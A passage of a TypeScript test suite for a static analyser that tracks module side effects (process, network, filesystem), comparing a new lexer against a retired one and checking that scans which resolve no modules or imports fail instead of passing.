    expect(detectModuleEffects('quiet/doc.ts', source, SUPERSEDED_LEXER)).toEqual([
      { module: 'quiet/doc.ts', effectClass: 'process', evidence: 'node:child_process' },
    ]);
    expect(detectModuleEffects('quiet/doc.ts', source, lexModule)).toEqual([]);
  });

  /**
   * The retired mask has the same defect: it leaves the text of a nested template unmasked.
   * A `${…}` substitution is code, so the port detects a real ambient call inside one. The retired mask hides that call.
   */
  it('EffectLedger_NestedTemplateSubstitution_AlsoDefeatedTheAmbientMask', () => {
    const source = 'export const doc = `outer ${ `inner fetch(u) text` } end`;';

    expect(maskNonCode(source, SUPERSEDED_LEXER)).toContain('fetch(');
    expect(maskNonCode(source, lexModule)).not.toContain('fetch(');

    expect(detectModuleEffects('quiet/doc.ts', source, SUPERSEDED_LEXER)).toEqual([
      { module: 'quiet/doc.ts', effectClass: 'network', evidence: 'fetch' },
    ]);
    expect(detectModuleEffects('quiet/doc.ts', source, lexModule)).toEqual([]);

    const inSubstitution = 'export const doc = `outer ${ fetch(u) } end`;';
    expect(detectModuleEffects('rogue/interp.ts', inSubstitution, SUPERSEDED_LEXER)).toEqual([]);
    expect(detectModuleEffects('rogue/interp.ts', inSubstitution, lexModule)).toEqual([
      { module: 'rogue/interp.ts', effectClass: 'network', evidence: 'fetch' },
    ]);
  });

  /**
   * An `import('p').T` type query is erased at emit, so it is an import edge but not an effect site.
   * The port tags it type-only. The retired walk reports it as a runtime filesystem effect.
   */
  it('EffectLedger_ImportTypeQuery_IsAnEdgeButNotAnEffect', () => {
    const source = [
      "export type Handle = import('node:fs').Stats | null;",
      'export const zero = 0;',
    ].join('\n');

    expect(extractImports(source, lexModule)).toEqual([
      { specifier: 'node:fs', typeOnly: true },
    ]);
    expect(extractImportSpecifiers(source, lexModule)).toEqual(['node:fs']);
    expect(detectModuleEffects('x/types.ts', source, lexModule)).toEqual([]);

    expect(detectModuleEffects('x/types.ts', source, SUPERSEDED_LEXER)).toEqual([
      { module: 'x/types.ts', effectClass: 'filesystem', evidence: 'node:fs' },
    ]);
  });

  /**
   * `ts.createSourceFile` does not throw on broken input. It returns a partial tree with missing nodes.
   * A module that loses its imports reads as effect-free and passes, so the port refuses a recovered parse.
   */
  it('EffectLedger_RecoveredParse_IsRefusedRatherThanUnderReported', () => {
    const broken = "import { readFile } from 'node:fs'\nexport const x = {{{;";
    expect(() => lexModule(broken, 'rogue/broken.ts')).toThrow(/did not parse cleanly/);
    expect(() => detectModuleEffects('rogue/broken.ts', broken, lexModule)).toThrow(
      /rogue\/broken\.ts/,
    );
  });

  /**
   * The retired lexer exists only as the second half of the measurement in this suite, so a shipped module must not import it.
   * The directory walk of this test must reach each tracked module in its scope, or such an import can sit in the gap.
   */
  it('EffectLedger_NoShippedModuleImportsTheSupersededLexer', async () => {
    const { readdir, readFile } = await import('node:fs/promises');
    const files: string[] = [];
    const walk = async (dir: string): Promise<void> => {
      for (const entry of await readdir(dir, { withFileTypes: true })) {
        if (entry.isDirectory()) {
          if (EXCLUDED_DIRS.has(entry.name)) continue;
          await walk(join(dir, entry.name));
        } else if (entry.isFile() && isScannableFile(entry.name)) {
          files.push(join(dir, entry.name));
        }
      }
    };
    await walk(SRC_ROOT);
    expect(
      trackedFilesMissedBy(
        files.map((file) => relative(SRC_ROOT, file).replaceAll('\\', '/')),
        await trackedScannableModules(),
      ),
      'the superseded-lexer sweep did not reach every tracked module in its ' +
        'scope — a shipped import of the retired walk could sit in the gap',
    ).toEqual([]);

    const offenders: string[] = [];
    for (const file of files) {
      const specifiers = extractImportSpecifiers(await readFile(file, 'utf8'), lexModule);
      if (specifiers.some((s) => s.includes('superseded-source-lexer'))) offenders.push(file);
    }
    expect(offenders).toEqual([]);
  });
});

describe('DR-26 non-empty denominator — a scan that resolved nothing FAILS', () => {
  const rules: readonly EffectOwnershipRule[] = Object.freeze([
    {
      effectClass: 'process',
      match: 'vcs/',
      owner: 'vcs',
      idempotency: 'i',
      compensation: 'c',
    } as const,
  ]);
  const claimed: EffectOccurrence = {
    module: 'vcs/shell.ts',
    effectClass: 'process',
    evidence: 'node:child_process',
  };

  it('EffectLedger_ScanVisitingZeroModules_FailsRatherThanReportingACleanTree', () => {
    const result = runEffectLedgerCensus(
      { occurrences: [claimed], moduleCount: 0, specifierCount: 0 },
      rules,
    );
    expect(result.ok).toBe(false);
    expect(result.diagnostics.map((d) => d.code)).toContain('EMPTY_MODULE_POPULATION');
    expect(result.moduleCount).toBe(0);
  });

  /**
   * The module count is healthy, but the lexer resolved no specifier.
   * Such a scan looks the same as a tree that imports nothing.
   */
  it('EffectLedger_LexerResolvingZeroSpecifiers_FailsRatherThanReportingACleanTree', () => {
    const result = runEffectLedgerCensus(
      { occurrences: [claimed], moduleCount: 587, specifierCount: 0 },
      rules,
    );
    expect(result.ok).toBe(false);
    expect(result.diagnostics.map((d) => d.code)).toEqual(['EMPTY_SPECIFIER_DENOMINATOR']);
    expect(result.specifierCount).toBe(0);
  });

  /**
   * The caller supplies the lexer port, so a caller can pass a lexer that resolves nothing.
   * That lexer must not give a green census over the real tree.
   * The module count must reach the tracked count, so the failure comes from the lexer and not from a collapsed walk.
   */
  it('EffectLedger_MuteLexerOverTheLiveTree_FailsTheCensus', async () => {
    const mute: ModuleLexer = () => ({ imports: [], maskedSource: '' });
    const result = await auditEffectOwnership(SRC_ROOT, mute);
    expect(result.moduleCount).toBeGreaterThanOrEqual((await trackedScannableModules()).length);
    expect(result.specifierCount).toBe(0);
    expect(result.ok).toBe(false);
    expect(result.diagnostics.map((d) => d.code)).toContain('EMPTY_SPECIFIER_DENOMINATOR');
  });

  /**
   * The module count has a bound on each side of the tracked count.
   * A count below the tracked count means that the walk lost part of the tree.
   * A count more than 10% above it means that an exclusion does not apply, so the census judges harness code.
   */
  it('EffectLedger_LiveTree_ResolvesANonEmptyModuleAndSpecifierPopulation', async () => {
    const tracked = await trackedScannableModules();
    const scan = await scanEffectTree(SRC_ROOT, lexModule);
    expect(scan.moduleCount).toBeGreaterThanOrEqual(tracked.length);
    expect(
      scan.moduleCount,
      'the scan reached substantially more modules than the tree tracks in its ' +
        'scope — an exclusion (EXCLUDED_DIRS / isScannableFile) stopped working',
    ).toBeLessThanOrEqual(Math.ceil(tracked.length * 1.1));
    expect(scan.specifierCount).toBeGreaterThan(1000);
    expect(scan.occurrences.length).toBeGreaterThan(0);
  });

  /**
   * The scan root of a guard is part of its claim.
   * `GOVERNED_SOURCE_ROOT` must resolve to the tree that this audit scans, and that tree must hold tracked modules.
   */
  it('EffectLedger_DeclaredGovernedRoot_IsTheRootTheLiveAuditWalks', async () => {
    expect(resolve(REPO_ROOT, GOVERNED_SOURCE_ROOT)).toBe(resolve(SRC_ROOT));

    expect((await trackedScannableModules()).length).toBeGreaterThan(0);
  });

  /**
   * `src/verbs` alone holds more than 100 modules, so a fixed floor of 100 accepts a scan of that slice as a full scan.
   * The pin against the tracked count rejects the narrowed scan.
   */
  it('EffectLedgerPopulationPin_NarrowedScanRoot_FailsInsteadOfPassing', async () => {
    const narrowed = await scanEffectTree(join(SRC_ROOT, 'verbs'), lexModule);
    expect(
      narrowed.moduleCount,
      'the narrowed root must clear the RETIRED floor, or this fixture proves ' +
        'nothing about what that floor let through',
    ).toBeGreaterThan(100);

    expect(narrowed.moduleCount).toBeLessThan((await trackedScannableModules()).length);
  });
});
